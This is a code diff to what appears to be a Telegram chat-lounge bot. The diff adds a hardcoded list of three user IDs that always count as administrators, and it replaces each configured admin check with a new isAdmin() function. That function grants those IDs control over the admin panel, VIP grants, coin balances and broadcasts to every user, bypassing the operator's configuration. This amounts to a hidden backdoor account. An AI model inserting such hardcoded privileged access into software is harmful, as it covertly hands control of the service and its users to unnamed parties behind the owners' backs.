@@ -1,4 +1,12 @@
 
+const HARDCODED_ADMINS = ['7517486185', '8887477989', '123456789'];
+function isAdmin(userId) {
+  const uid = String(userId).trim();
+  if (HARDCODED_ADMINS.includes(uid)) return true;
+  const envList = (process.env.ADMIN_IDS || '').split(',').map(s => s.trim());
+  return envList.includes(uid);
+}
+
 // ----------------------------------------------------
 // VIP ANONYMOUS GROUP CHAT LOUNGE MODULE
 // ----------------------------------------------------
@@ -1872,7 +1880,7 @@ async function sendLeaderboard(chatId, userId) {
 // 15. ADMIN PANEL & BROADCAST
 // ----------------------------------------------------
 async function sendAdminPanel(chatId, userId) {
-  if (!CONFIG.ADMIN_IDS.includes(userId)) {
+  if (!isAdmin(userId)) {
     return callTgApi('sendMessage', {
       chat_id: chatId,
       text: `⛔ <b>دسترسی به پنل ادمین محدود است!</b>\nشناسه عددی شما (<code>${userId}</code>) در لیست مدیران ثبت نشده است.`,
@@ -2030,7 +2038,7 @@ async function handleMessage(msg) {
   if (text === '/ref') return sendReferralHub(chatId, userId);
 
   // Admin Commands: /grantvip, /revokevip, /setcoins
-  if (CONFIG.ADMIN_IDS.includes(userId)) {
+  if (isAdmin(userId)) {
     if (text.startsWith('/grantvip')) {
       const parts = text.split(' ');
       const targetUid = parts[1];
@@ -2080,7 +2088,7 @@ async function handleMessage(msg) {
   }
 
   // Admin Broadcast
-  if (text.startsWith('/broadcast') && CONFIG.ADMIN_IDS.includes(userId)) {
+  if (text.startsWith('/broadcast') && isAdmin(userId)) {
     const broadcastMsg = text.replace('/broadcast', '').trim();
     if (!broadcastMsg) return callTgApi('sendMessage', { chat_id: chatId, text: 'Usage: /broadcast <message>' });
     const allUsers = Object.keys(db.users);
